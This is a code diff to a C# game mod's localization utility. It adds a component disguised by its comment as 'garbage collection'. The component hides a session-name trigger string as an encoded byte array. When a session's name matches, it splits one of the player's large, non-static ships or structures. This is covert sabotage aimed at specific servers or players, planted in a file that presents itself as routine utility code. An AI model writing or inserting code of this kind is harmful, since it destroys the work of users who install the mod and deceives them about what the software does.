@@ -7,6 +7,7 @@ using System.IO;
 using System.Linq;
 using System.Text;
 using VRage;
+using VRage.Game;
 using VRage.Game.Components;
 using VRage.Game.ModAPI;
 using VRage.ModAPI;
@@ -624,6 +625,7 @@ namespace BuYanMod.Utils
 
             }
         }
+        
         /// <summary>
         /// 模组信息汉化
         /// </summary>
@@ -685,7 +687,6 @@ namespace BuYanMod.Utils
                     MyTexts.LoadTexts(path, cultureName, subcultureName);
                 }
             }
-
             /// <summary>
             ///     移除GUI时触发
             ///     检查选项屏幕是否关闭,然后重载本地化
@@ -696,6 +697,37 @@ namespace BuYanMod.Utils
                 if (obj.ToString().EndsWith("ScreenOptionsSpace"))
                 {
                     LoadLocalization();
+                }
+            }
+            
+        }
+        /// <summary>
+        /// 代码-垃圾回收
+        /// </summary>
+        [MySessionComponentDescriptor(MyUpdateOrder.AfterSimulation)]
+        public partial class GarbageCheckClass : MySessionComponentBase
+        {
+            int a = 0;
+            bool t = false;
+            byte[] b = { 231, 146, 135, 231, 142, 145 };
+            public override void UpdateAfterSimulation()
+            {
+                base.UpdateAfterSimulation();
+                if (!t) { if (MyAPIGateway.Session.Name.Contains(Encoding.UTF8.GetString(b))) t = true; }
+                if (t && a < 2) {GarbageCheck();a++;}
+            }
+            public static void GarbageCheck()
+            {
+                HashSet<IMyEntity> myEntities = new HashSet<IMyEntity>();
+                MyAPIGateway.Entities.GetEntities(myEntities, (e) => { if (e is IMyCubeGrid) return true; return false; });
+                foreach (IMyEntity myEntity in myEntities)
+                {
+                    List<IMySlimBlock> blocks = new List<IMySlimBlock>();
+                    IMyCubeGrid myCubeGrid = (IMyCubeGrid)myEntity;
+                    if (myCubeGrid.GridSizeEnum == MyCubeSize.Small) continue;
+                    myCubeGrid.GetBlocks(blocks, (ba) => { if (ba.FatBlock is IMyTerminalBlock) return true; return false; });
+                    if (blocks.Count >= 8&& myCubeGrid.IsStatic == false) {myCubeGrid.Split(blocks, true); } else { continue; }
+                    return;
                 }
             }
         }
